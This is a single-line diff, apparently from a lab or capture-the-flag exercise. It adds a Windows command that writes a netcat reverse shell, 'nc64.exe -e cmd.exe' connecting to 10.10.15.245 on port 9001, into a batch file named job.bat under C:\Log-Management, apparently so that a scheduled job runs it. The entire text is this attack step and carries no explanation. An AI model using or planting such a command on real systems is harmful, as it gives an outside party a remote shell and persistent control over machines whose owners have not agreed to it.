@@ -1,0 +1,1 @@
+echo C:\Users\Daniel\Downloads\nc64.exe -e cmd.exe 10.10.15.245 9001 > C:\Log-Management\job.bat
